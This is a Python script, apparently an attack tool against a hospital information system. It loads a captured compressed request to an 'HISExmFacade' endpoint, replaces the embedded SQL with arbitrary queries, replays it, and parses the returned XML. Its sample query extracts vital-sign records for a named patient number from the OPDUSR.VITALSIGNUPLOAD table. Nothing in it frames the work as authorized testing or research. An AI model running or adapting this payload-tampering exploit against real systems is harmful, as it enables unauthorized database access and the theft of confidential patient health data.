from his_client_final import HISClient
import requests
import zlib
import re

class CandidateHunter(HISClient):
    def execute_sql(self, sql):
        print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}). Cannot execute.")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = CandidateHunter()
hhistnum = '003617083J'

candidates = [
    f"SELECT * FROM OPDUSR.VITALSIGNUPLOAD WHERE HHISNUM = '{hhistnum}' ORDER BY OCCURDATE DESC"
]

for q in candidates:
    res = hunter.execute_sql(q)
    if res and "<NewDataSet>" in res:
             print(f"[+] Data returned for {q}!")
             
             import re
             # Parse all rows to find matches
             # <EVENT_TYPE>...</EVENT_TYPE> <NVALUE1>...</NVALUE1>
             rows = re.findall(r'<DRMODIFY.*?>(.*?)</DRMODIFY>', res, re.DOTALL)
             print(f"[+] Total Rows: {len(rows)}")
             
             for row in rows:
                 etype = re.search(r'<EVENT_TYPE>(.*?)</EVENT_TYPE>', row)
                 nval1 = re.search(r'<NVALUE1>(.*?)</NVALUE1>', row)
                 occur = re.search(r'<OCCURDATE>(.*?)</OCCURDATE>', row)
                 
             for row in rows:
                 etype = re.search(r'<EVENT_TYPE>(.*?)</EVENT_TYPE>', row)
                 nval1 = re.search(r'<NVALUE1>(.*?)</NVALUE1>', row)
                 occur = re.search(r'<OCCURDATE>(.*?)</OCCURDATE>', row)
                 
                 et = etype.group(1) if etype else "?"
                 nv = nval1.group(1) if nval1 else "?"
                 oc = occur.group(1) if occur else "?"
                 
                 print(f"  {oc} | {et} | {nv}")
 


